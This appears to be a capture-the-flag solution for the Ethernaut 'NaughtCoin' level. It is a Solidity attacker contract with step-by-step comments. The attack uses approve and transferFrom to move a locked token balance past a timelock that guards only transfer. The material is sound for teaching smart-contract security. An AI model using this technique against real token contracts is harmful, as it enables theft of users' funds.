// 1 - Deploy this contract - Remix
// 2 - Approve this contract as spender -
// await contract.approve("0xD1494fE1EFEba8cfFDC4B38fc32B98a10E408Eb1", await contract.balanceOf(player)); - Chrome Console
// 3 - Call attack - Remix

// When using code that's not your own, it's a good idea to familiarize yourself with
// it to get a good understanding of how everything fits together. This can be particularly
// important when there are multiple levels of imports (your imports have imports) or when you
// are implementing authorization controls, e.g. when you're allowing or disallowing people
// from doing things. In this example, a developer might scan through the code and think that
// transfer is the only way to move tokens around, low and behold there are other ways of performing
// the same operation with a different implementation.

pragma solidity ^0.6.0;

interface INaughtCoin {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract NaughtCoinAttacker {
    INaughtCoin public naughtCoin;

    constructor(address challengeAddress) public payable {
        naughtCoin = INaughtCoin(challengeAddress);
    }

    function attack() external {
        uint256 balance = naughtCoin.balanceOf(msg.sender);
        naughtCoin.transferFrom(msg.sender, address(this), balance);
    }
}
